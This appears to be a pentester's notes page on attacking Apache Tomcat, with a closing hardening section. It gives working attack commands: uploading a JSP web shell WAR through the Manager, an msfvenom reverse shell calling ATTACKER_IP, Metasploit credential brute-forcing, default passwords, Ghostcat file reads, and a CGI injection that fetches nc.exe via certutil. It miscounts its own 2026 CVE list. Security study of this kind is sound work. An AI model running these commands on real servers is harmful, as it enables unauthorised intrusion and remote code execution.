+++
title = 'Apache Tomcat'
date = 2026-10-30
type = 'notes'
weight = 10
toc = true
tags = ['web', 'web-technologies', 'tomcat', 'java']
+++

Apache Tomcat is the reference implementation of Jakarta Servlet, Jakarta Pages, and Jakarta WebSocket — it is the default Java application server for millions of deployments, and it ships inside countless appliances, CI/CD tools, and management consoles that developers do not realise are running Tomcat under the hood.

For an attacker, Tomcat is valuable for three reasons: the **Manager and Host Manager** web applications deploy arbitrary WAR files (immediate RCE), the **AJP connector** on port 8009 is frequently exposed and still exploitable via Ghostcat, and the **path normalisation difference** between a reverse proxy and Tomcat enables authentication and security-constraint bypass.

> **2025–2026 context:** Tomcat is not a legacy target. The project shipped **ten CVEs in 2026 alone** (CVE-2025-66614, CVE-2026-24880, CVE-2026-25854, CVE-2026-29129, CVE-2026-29145, CVE-2026-29146, CVE-2026-32990, CVE-2026-34483, CVE-2026-34486, CVE-2026-34487, CVE-2026-34500). **CVE-2025-55752** (rewrite path traversal → RCE when `PUT` is enabled) and **CVE-2025-66614** (improper input validation, with **CVE-2026-32990** as an incomplete fix) are the current high-severity findings. **Ghostcat (CVE-2020-1938) is still being mass-scanned for in 2025** and remains a persistent finding in penetration tests.

---

## 1. Directory Structure

```
├── bin/          # Startup scripts (catalina.sh, startup.sh)
├── conf/         # Configuration
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── server.xml            # Connectors, ports, AJP secret
│   ├── tomcat-users.xml      # Manager/Host-Manager credentials and roles
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib/          # JAR files for Tomcat itself
├── logs/         # Access and error logs
├── temp/         # Temporary files
├── webapps/      # Default webroot — deployed applications
│   ├── ROOT/
│   │   ├── index.jsp
│   │   ├── META-INF/
│   │   │   └── context.xml
│   │   └── WEB-INF/
│   │       ├── web.xml        # Sensitive — servlet mappings, security constraints
│   │       ├── classes/       # Compiled application classes
│   │       └── lib/           # Application JARs
│   └── ...
└── work/         # JSP compilation cache
    └── Catalina/localhost/
```

---

## 2. Footprinting and Enumeration

| Command / Action | Purpose |
|---|---|
| `curl -i http://target:8080/invalid` | Error page discloses **server and version** |
| `curl -s http://target:8080/docs/ \| grep -i tomcat` | Default docs page — confirms Tomcat and version |
| `curl -I http://target:8080/manager/html` | Manager exists? Returns `200`, `302`, or `401` |
| `curl -I http://target:8080/host-manager/html` | Host Manager exists? |
| `curl -I http://target:8080/examples/` | Default examples — often left deployed |
| `nmap -p 8009,8080,8443 --script ajp-* target` | AJP connector and management ports |
| **`apachetomcatscanner`** | Multi-threaded scanner — target discovery, version, Manager, AJP |
| **FuzzDB Tomcat wordlist** | Fuzz webapps, Manager paths, and default applications |

**ApacheTomcatScanner:**

```bash
sudo python3 -m pip install apachetomcatscanner
apachetomcatscanner -h

# Scan a range for Tomcat, Manager, and AJP
apachetomcatscanner -t 10.10.10.0/24

# Targeted scan with custom ports
apachetomcatscanner -t target.example -p 8080,8443,8009
```

> The tool is **multithreaded**, accepts **multiple target sources** (CIDR, file, single host), and detects the Manager and Host Manager paths plus the AJP port.

---

## 3. Recent Critical CVEs (2025–2026)

| CVE | Severity | Primitive | Affected |
|---|---|---|---|
| **CVE-2025-55752** | **High (7.5)** | **Relative path traversal** in the Rewrite Valve — the fix for bug 60013 normalised the URL **before** decoding, so a rewrite rule that moves query parameters into the path lets an attacker bypass `/WEB-INF/` and `/META-INF/` protections. **If `PUT` is enabled, this leads to RCE** | 11.0.0-M1 → 11.0.10, 10.1.0-M1 → 10.1.44, 9.0.0.M11 → 9.0.108, 8.5.6 → 8.5.100 |
| **CVE-2025-66614** | Critical | Improper input validation | 11.0.0-M1 → 11.0.14 |
| **CVE-2026-32990** | High | **Incomplete fix** for CVE-2025-66614 | 9.0.115 → 9.0.120, 10.1.53 → 10.1.57, 11.0.20 → 11.0.24 |
| **CVE-2026-65182** | Important | **Security constraint bypass** — a constraint for a longer path specified before a more restrictive constraint for a shorter sub-path is not enforced | 7.0.0 → 7.0.109, 8.5.0 → 8.5.100, 9.0.0.M1 → 9.0.120, 10.1.0-M1 → 10.1.57, 11.0.0-M1 → 11.0.24 |
| **CVE-2026-65905** | — | **DIGEST authenticator capture-replay** — a request with a `nonceCount` at the upper boundary of the replay window is replayable once | 7.0.30 → 7.0.109, 8.5.0 → 8.5.100, 9.0.0.M1 → 9.0.120, 10.1.0-M1 → 10.1.57, 11.0.0-M1 → 11.0.24 |
| **CVE-2026-65183** | — | **TOCTOU race** when creating Unix domain sockets — unauthorised local user gains socket access | 9.0.42 → 9.0.120, 10.1.0-M1 → 10.1.57, 11.0.0-M1 → 11.0.24 |

> **CVE-2025-55752 is the one to check first.** The precondition is a **Rewrite Valve rule that rewrites query parameters into the URL** and **`PUT` enabled** — uncommon in production but common in lab targets. The traversal lets you reach `/WEB-INF/web.xml` even when the security constraint should block it.

---

## 4. Tomcat Manager Attacks

Access to `/manager` or `/host-manager` is the shortest path to RCE: both expose a **WAR deployment** feature that runs an attacker-supplied application on the server.

### 4.1 Roles and paths

| Path | Required role |
|---|---|
| `/manager/html` | `manager-gui` — browser UI |
| `/manager/text` | **`manager-script`** — text API |
| `/host-manager/html` | **`admin-gui`** — separate role |

> **An account can have `manager-script` without `manager-gui`.** If `/manager/html` returns `403` but `/manager/text` returns `200`, you can still deploy a WAR via `curl` — try the text API **before** giving up.

### 4.2 Default and weak credentials

Tomcat itself **does not ship a default login** — the `tomcat-users.xml` must be edited to create one. However, **appliances and vendors frequently hardcode one**, and the common lab and real-world values are:

```
tomcat:tomcat
tomcat:s3cret
admin:admin
admin:password
admin: (blank)
both:tomcat
role1:tomcat
manager:manager
sadmin:sadmin     # Oracle-seeded Tomcat
```

> **CVE-level case:** Mandiant and Google Threat Intelligence documented a 2025 intrusion where the **hardcoded Tomcat Manager credentials** in Dell RecoverPoint for Virtual Machines were the initial access vector — the attackers uploaded a malicious WAR containing the **SLAYSTYLE** web backdoor, then used **Brickstorm** as a relay. Default Manager credentials are not a lab curiosity.

### 4.3 Bruteforcing

```bash
# Metasploit
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS target
set RPORT 8080
run
```

> If the module errors, set `PROXIES http://127.0.0.1:8080` and intercept the requests in Burp to adjust the form fields — the login form differs across Tomcat versions.

### 4.4 WAR deployment — RCE

**Manual:**

```bash
# 1. Get a JSP web shell
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

# 2. Package it as a WAR
zip -r backup.war cmd.jsp

# 3. Deploy via the Manager UI (/manager/html) — upload backup.war
#    Or via the text API:
curl -u tomcat:s3cret \
  -T backup.war \
  "http://target:8080/manager/text/deploy?path=/backup&update=true"

# 4. Execute
curl "http://target:8080/backup/cmd.jsp?cmd=id"
```

**Reverse shell WAR:**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > backup.war

# Listener
nc -lvnp 4444

# Deploy
curl -u tomcat:s3cret -T backup.war \
  "http://target:8080/manager/text/deploy?path=/backup&update=true"

# Trigger
curl "http://target:8080/backup/"
```

**Metasploit automation:**

```text
use multi/http/tomcat_mgr_upload
set RHOSTS target
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
run
```

> **The `manager-script` text API is the most reliable deployment path.** It does not require the browser UI, works with `curl`, and the `?path=/backup&update=true` parameters let you redeploy over an existing application.

---

## 5. Path Traversal via Reverse Proxy

### 5.1 The `/..;/` normalisation difference

Tomcat treats `/..;/` as `/../` and normalises the path, while most reverse proxies (Nginx, Apache as proxy, AWS ALB, Cloudflare, Akamai) do **not** normalise it and forward the literal sequence. This allows reaching resources the proxy's ACL blocks:

```
http://target/blabla/..;/manager/html
http://target/;param=value/manager/html
```

> **The Host Manager restriction:** if the request reaches `/host-manager` but the response says *“the Host Manager is only accessible from a browser running on the same machine”*, the traversal worked but the **RemoteAddrValve** is enforcing localhost-only access. The path bypass is confirmed; the ACL is a separate barrier.

### 5.2 CVE-2025-55752 — rewrite-based traversal

The Rewrite Valve rule rewrites query parameters into the URL. The fix for bug 60013 **normalised the rewritten URL before decoding it**, so an attacker can supply a URI that decodes to a traversal sequence after normalisation:

```
GET /app/..%2f..%2fWEB-INF/web.xml HTTP/1.1
```

If `PUT` is enabled, upload a JSP into the webroot through the same traversal, then access it — **RCE**.

### 5.3 Nuclei template

A community template detects the semicolon-encoded path-normalisation bypass:

```bash
nuclei -u http://target -t path-normalization-auth-bypass-semicolon-encoded.yaml
```

It tests the exact class: the front-tier applies its ACL to the **literal path**, the backend normalises `..;/`.

---

## 6. GhostCat — CVE-2020-1938

**AJP** is the binary protocol Tomcat uses to talk to a front-end web server (`mod_jk`, `mod_proxy_ajp`, IIS). It listens on **port 8009 by default**, and it was designed assuming anything speaking to it is a **trusted internal component** — not a hostile client.

### 6.1 The vulnerability

An attacker who can reach port 8009 sends a crafted AJP request that sets `javax.servlet.include.request_uri` and `javax.servlet.include.path_info`. Tomcat's `RequestDispatcher` treats the attacker-supplied value as an internal include target, allowing:

- **Arbitrary file read** anywhere under the webapp document root — including `WEB-INF/web.xml`, source code, configuration files, and credentials.
- **RCE** if the attacker can also write a file into the webapp — most commonly through an unrestricted file upload. Upload a JSP disguised as an image, then use the AJP include to execute it.

**Affected:** Tomcat 9.x < 9.0.31, 8.5.x < 8.5.51, 7.x < 7.0.100, and 6.x (EOL, no patch).

### 6.2 Exploitation

```bash
# Python 3 PoC
python3 tomcat-ajp.lfi.py target.example -p 8009 -f WEB-INF/web.xml

# Multi-target scanner with custom wordlists and upload-point detection
git clone https://github.com/abrewer251/CVE-2020-1938_Ghostcat-PoC
```

The current PoCs support **multi-target scanning**, **custom wordlists**, and **upload-point detection** — the last is what turns file read into RCE.

### 6.3 The AJP `secret`

Tomcat 9.0.31+ introduced `secretRequired` — an AJP connector with `secretRequired="true"` and a `secret` value rejects requests that do not present the secret.

**However, the secret comparison was performed in non-constant time** (CVE-2026-65828 / FLAT-PSZXK), allowing a **local-network timing attack** to recover the secret. Affected: 7.0.0 → 7.0.109, 8.5.0 → 8.5.100, 9.0.0.M1 → 9.0.117, 10.1.0-M1 → 10.1.54, 11.0.0-M1 → 11.0.21.

> **Ghostcat is still worth testing on every engagement.** It has been mass-scanned since 2020, and unpatched appliances, embedded consoles, and CI/CD servers continue to surface as findings.

---

## 7. Tomcat CGI — CVE-2019-0232 (Windows)

The **CGI Servlet** executes external programs that conform to the CGI specification. On Windows, when `enableCmdLineArguments=true`, Tomcat passes **query-string parameters as command-line arguments** to the CGI script — and does not adequately validate them.

**Affected:** 9.0.0.M1 → 9.0.17, 8.5.0 → 8.5.39, 7.0.0 → 7.0.93, on **Windows only**, with `enableCmdLineArguments=true`.

### 7.1 Find a CGI script

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt \
  -u http://target:8080/cgi/FUZZ.cmd

ffuf -w /usr/share/dirb/wordlists/common.txt \
  -u http://target:8080/cgi/FUZZ.bat
```

### 7.2 Command injection

Once a `.cmd` or `.bat` file is found, append `&command`:

```
http://target:8080/cgi/welcome.bat?&dir
http://target:8080/cgi/welcome.bat?&whoami
```

> **Troubleshooting:** use the **absolute path** to the command, or URL-encode the payload. On modern Windows, `powershell.exe` is **not in the CGI script's PATH** — specify the full path (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`).

### 7.3 Automated reverse shell

```bash
python cve-2019-0232.py revshell \
  -t http://target:8080 \
  --lhost ATTACKER_IP --lport 4444
```

The tool uses **certutil** to download `nc.exe` to the target, then triggers the reverse shell through the CGI injection.

---

## 8. Fileless / Memory Webshells (2025–2026)

The most significant **defence-evasion** development in the Tomcat ecosystem is the **fileless web shell** — a Java implant injected into the running JVM that leaves **no file on disk**.

### 8.1 How it works

The implant is written as a Java class, compiled to bytecode, **encrypted in transit**, and loaded into the Tomcat process through one of the container's own extension points:

| Injection point | Component |
|---|---|
| **Filter** | `jakarta.servlet.Filter` / `javax.servlet.Filter` |
| **Servlet** | `jakarta.servlet.Servlet` |
| **Listener** | `jakarta.servlet.ServletContextListener` |
| **Valve** | Tomcat-specific request pipeline component |
| **ProxyValve** | Tomcat 10+ |
| **AgentFilterChain** | Java Instrumentation API |

The implant hooks `Runtime.getRuntime().exec()` or an equivalent sink, and communicates over **encrypted, chunked traffic** so that network detection cannot pattern-match the request.

### 8.2 Real-world use

**VersaMem** — a fileless Java implant associated with **Volt Typhoon**, observed in Versa Director zero-day exploitation. It was delivered as a JAR that attached itself to the **Apache Tomcat Java servlet** using the **Java Instrumentation API and Javassist** to modify existing Java code **in memory**.

> **The detection problem:** a memory shell has no file artifact, so file-integrity monitoring and on-disk AV do not see it. Detection requires **memory tracing**, **dynamic baselining**, or a dedicated **memory-shell detector** that enumerates the container's filter/servlet/valve registry and flags classes that do not belong.

---

## 9. Tooling

| Tool | Purpose |
|---|---|
| **ApacheTomcatScanner** (p0dalirius) | Multi-threaded discovery — version, Manager, Host Manager, AJP |
| **`multi/http/tomcat_mgr_upload`** | Metasploit WAR deployment → meterpreter |
| **`auxiliary/scanner/http/tomcat_mgr_login`** | Manager credential bruteforce |
| **`msfvenom -f war`** | JSP reverse shell WAR generation |
| **`CVE-2019-0232.py`** | Automated CGI command injection / reverse shell on Windows |
| **Ghostcat PoCs** | AJP file read and upload-point detection |
| **`nuclei`** | CVE-2025-55752 and semicolon path-bypass templates |
| **`memshell CLI`** | Generates memory shells for Filter, Listener, Valve, Servlet, ProxyValve, and AgentFilterChain |
| **`memory-shell-detector`** | Java memory-shell detection for Tomcat, Jetty, and others |

---

## 10. Testing Methodology

```text
1. Footprint
   - /invalid error page → version
   - /docs/ → version confirmation
   - nmap -p 8009,8080,8443 --script ajp-*
   - apachetomcatscanner -t target

2. Manager
   - /manager/html → 200/302/401?
   - /manager/text → 200? (manager-script without manager-gui)
   - /host-manager/html → admin-gui?
   - Try default credentials: tomcat:s3cret, admin:admin, sadmin:sadmin
   - Bruteforce with auxiliary/scanner/http/tomcat_mgr_login
   - Deploy WAR via UI or text API → RCE

3. Path traversal
   - /blabla/..;/manager/html
   - /;param=value/manager/html
   - CVE-2025-55752: rewrite + PUT → upload JSP to webroot
   - nuclei semicolon-path-bypass template

4. Ghostcat
   - Is port 8009 open?
   - python3 tomcat-ajp.lfi.py target -p 8009 -f WEB-INF/web.xml
   - If upload exists → JSP → RCE

5. CGI (Windows)
   - ffuf /cgi/FUZZ.cmd and /cgi/FUZZ.bat
   - ?&dir / ?&whoami
   - cve-2019-0232.py revshell

6. Recent CVEs
   - CVE-2025-55752 (rewrite traversal + PUT)
   - CVE-2025-66614 / CVE-2026-32990 (input validation)
   - CVE-2026-65182 (security constraint bypass)
   - CVE-2026-65905 (DIGEST replay)
```

---

## 11. Hardening (Defender Perspective)

| Control | How |
|---|---|
| **Patch Tomcat** | The 2026 advisories recommend **11.0.25, 10.1.58, 9.0.121** or later |
| **Remove or restrict Manager** | Delete `manager` and `host-manager` from `webapps/` if unused; bind them to `127.0.0.1` via `RemoteAddrValve` |
| **Strong Manager credentials** | Never ship a default; rotate `tomcat-users.xml` secrets |
| **Disable AJP** | Comment out the AJP connector if it is not used; otherwise set `secretRequired="true"` with a strong secret and bind to localhost |
| **Disable `PUT`** | `readonly="true"` on the DefaultServlet unless WebDAV is required |
| **Audit Rewrite Valve rules** | CVE-2025-55752 requires a rewrite that moves query parameters into the path — review every rule |
| **Constant-time secret comparison** | Patch the AJP timing side channel (CVE-2026-65828) |
| **Detect memory shells** | Baseline the Filter/Servlet/Valve registry; alert on new or unrecognised classes |

---

## 12. Field Notes

- **CVE-2025-55752 is the current high-severity finding** — relative path traversal through the Rewrite Valve, with **RCE if `PUT` is enabled**.
- **The Manager text API (`/manager/text`) is the deployment path that works without the browser UI** — an account with `manager-script` but not `manager-gui` still gives you RCE.
- **Hardcoded Manager credentials are a real initial-access vector.** Dell RecoverPoint shipped them, and Mandiant documented the SLAYSTYLE/Brickstorm intrusion chain that followed.
- **Ghostcat is still mass-scanned and still found.** AJP is enabled by default on port 8009, and the file read reaches `WEB-INF/web.xml` and application secrets.
- **The AJP `secret` is a timing side channel** (CVE-2026-65828) — a local-network attacker can recover it character by character.
- **`/..;/` is the reverse-proxy bypass that still works** because the proxy and Tomcat normalise differently — and it applies to Nginx, ALB, Cloudflare, and Akamai as front-ends.
- **CVE-2019-0232 needs `enableCmdLineArguments=true` on Windows** — but when it is enabled, a single `?&whoami` after a `.bat` file is RCE.
- **Fileless memory shells are the 2025–2026 evasion technique.** VersaMem (Volt Typhoon) used the Instrumentation API and Javassist to inject into Tomcat's servlet in memory — no file, no on-disk artifact.
- **The CGI path still requires a real `.cmd`/`.bat` file** — fuzz for it before assuming the vulnerability is exploitable.
